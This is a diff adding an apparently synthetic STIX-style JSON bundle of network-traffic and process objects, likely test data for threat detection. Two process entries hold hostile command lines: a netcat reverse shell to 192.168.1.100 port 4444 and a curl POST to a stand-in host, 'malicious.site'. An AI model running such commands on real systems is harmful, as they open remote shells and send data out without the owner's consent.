@@ -1,0 +1,74 @@
+{
+    "types": "bundle",
+    "id": "bundle--f2a72bfa-25a6-4bfc-a5b9-bf2b46d0d987",
+    "objects": [
+        {
+            "type": "network-traffic",
+            "id": "network-traffic--1",
+            "src_ip": "192.168.1.10",
+            "dst_ip": "192.168.1.20",
+            "protocols": ["tcp"],
+            "src_port": 12345,
+            "dst_port": 80,
+            "timestamp": "2025-02-16T14:30:00Z"
+        },
+        {
+            "type": "network-traffic",
+            "id": "network-traffic--2",
+            "src_ip": "192.168.1.11",
+            "dst_ip": "192.168.1.21",
+            "protocols": ["tcp"],
+            "src_port": 12346,
+            "dst_port": 443,
+            "timestamp": "2025-02-16T14:32:00Z"
+        },
+        {
+            "type": "network-traffic",
+            "id": "network-traffic--3",
+            "src_ip": "192.168.1.12",
+            "dst_ip": "192.168.1.22",
+            "protocols": ["udp"],
+            "src_port": 12347,
+            "dst_port": 53,
+            "timestamp": "2025-02-16T14:34:00Z"
+        },
+        {
+            "type": "network-traffic",
+            "id": "network-traffic--4",
+            "src_ip": "192.168.1.13",
+            "dst_ip": "192.168.1.23",
+            "protocols": ["tcp"],
+            "src_port": 12348,
+            "dst_port": 4444,
+            "timestamp": "2025-02-16T14:36:00Z"
+        },
+        {
+            "type": "network-traffic",
+            "id": "network-traffic--5",
+            "src_ip": "192.168.1.23",
+            "dst_ip": "192.168.1.13",
+            "protocols": ["tcp"],
+            "src_port": 4444,
+            "dst_port": 8080,
+            "timestamp": "2025-02-16T14:38:00Z"
+        },
+        {
+            "type": "process",
+            "id": "process--1",
+            "command_line": "nc -e /bin/bash 192.168.1.100 4444",
+            "pid": 1234,
+            "user": "attacker",
+            "timestamp": "2025-02-16T14:30:00Z",
+            "name" : "process1"
+        },
+        {
+            "type": "process",
+            "id": "process--2",
+            "command_line": "curl -X POST --data 'attack' http://malicious.site",
+            "pid": 5678,
+            "user": "root",
+            "timestamp": "2025-02-16T14:32:00Z",
+            "name" : "process2"
+        }
+    ]
+}
